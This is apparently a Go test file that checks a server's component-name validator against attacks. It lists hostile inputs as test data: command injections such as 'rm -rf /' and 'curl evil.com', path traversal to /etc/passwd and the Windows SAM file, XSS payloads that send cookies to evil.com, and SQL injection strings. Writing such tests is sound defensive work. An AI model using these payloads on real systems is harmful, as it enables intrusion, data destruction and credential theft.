package server

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// TestValidateComponentName_Security tests component name validation security
func TestValidateComponentName_Security(t *testing.T) {
	tests := []struct {
		name         string
		componentName string
		expectError  bool
		errorType    string
	}{
		{
			name:         "valid component name",
			componentName: "Button",
			expectError:  false,
		},
		{
			name:         "valid camelCase name",
			componentName: "MyComponent",
			expectError:  false,
		},
		{
			name:         "valid with numbers",
			componentName: "Button123",
			expectError:  false,
		},
		{
			name:         "empty component name",
			componentName: "",
			expectError:  true,
			errorType:    "empty",
		},
		{
			name:         "path traversal attempt",
			componentName: "../../../etc/passwd",
			expectError:  true,
			errorType:    "path traversal",
		},
		{
			name:         "absolute path attempt",
			componentName: "/etc/passwd",
			expectError:  true,
			errorType:    "absolute path",
		},
		{
			name:         "path separator in name",
			componentName: "components/Button",
			expectError:  true,
			errorType:    "path separators",
		},
		{
			name:         "script injection attempt",
			componentName: "<script>alert('xss')</script>",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "sql injection attempt",
			componentName: "'; DROP TABLE components; --",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "command injection attempt",
			componentName: "Button; rm -rf /",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "shell metacharacter pipe",
			componentName: "Button | cat /etc/passwd",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "shell metacharacter ampersand",
			componentName: "Button & curl evil.com",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "shell metacharacter backtick",
			componentName: "Button`whoami`",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "shell metacharacter dollar",
			componentName: "Button$(malicious)",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "excessive length name",
			componentName: strings.Repeat("A", 101), // Over 100 char limit
			expectError:  true,
			errorType:    "too long",
		},
		{
			name:         "maximum allowed length",
			componentName: strings.Repeat("A", 100), // Exactly 100 chars
			expectError:  false,
		},
		{
			name:         "quote injection attempt",
			componentName: "Button\"malicious\"",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "single quote injection",
			componentName: "Button'malicious'",
			expectError:  true,
			errorType:    "dangerous character",
		},
		{
			name:         "backslash attempt",
			componentName: "Button\\malicious",
			expectError:  true,
			errorType:    "dangerous character",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateComponentName(tt.componentName)
			
			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				if tt.errorType != "" {
					assert.Contains(t, strings.ToLower(err.Error()), tt.errorType, 
						"Error should contain expected type: %s", tt.errorType)
				}
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestSecurityRegression_NoPathTraversal verifies path traversal is prevented
func TestSecurityRegression_NoPathTraversal(t *testing.T) {
	// Test cases based on common path traversal patterns
	pathTraversalAttempts := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
		"/./../../../etc/passwd",
		"/./../../etc/passwd",
		"../../../../../../etc/passwd",
		"..//////../../../etc/passwd",
		"../\\..\\/..\\etc/passwd",
	}

	for _, attempt := range pathTraversalAttempts {
		t.Run("Prevent: "+attempt, func(t *testing.T) {
			err := validateComponentName(attempt)
			assert.Error(t, err, "Path traversal should be prevented: %s", attempt)
		})
	}
}

// TestSecurityRegression_NoXSSInjection verifies XSS injection is prevented
func TestSecurityRegression_NoXSSInjection(t *testing.T) {
	xssAttempts := []string{
		"<script>alert('xss')</script>",
		"<img src=x onerror=alert('xss')>",
		"<svg onload=alert('xss')>",
		"<iframe src=javascript:alert('xss')>",
		"<body onload=alert('xss')>",
		"<div onclick=alert('xss')>",
		"javascript:alert('xss')",
		"<script>document.location='http://evil.com/'+document.cookie</script>",
		"<img src='x' onerror='fetch(\"http://evil.com/\"+document.cookie)'>",
	}

	for _, attempt := range xssAttempts {
		t.Run("Prevent: "+attempt, func(t *testing.T) {
			err := validateComponentName(attempt)
			assert.Error(t, err, "XSS injection should be prevented: %s", attempt)
		})
	}
}

// TestSecurityRegression_NoSQLInjection verifies SQL injection patterns are blocked
func TestSecurityRegression_NoSQLInjection(t *testing.T) {
	sqlInjectionAttempts := []string{
		"'; DROP TABLE components; --",
		"' OR '1'='1",
		"' UNION SELECT * FROM users --",
		"'; INSERT INTO admin VALUES ('hacker', 'password'); --",
		"' OR 1=1 --",
		"admin'--",
		"admin'/*",
		"' OR 'x'='x",
		"' AND 1=0 UNION SELECT password FROM users WHERE username='admin'--",
	}

	for _, attempt := range sqlInjectionAttempts {
		t.Run("Prevent: "+attempt, func(t *testing.T) {
			err := validateComponentName(attempt)
			assert.Error(t, err, "SQL injection should be prevented: %s", attempt)
		})
	}
}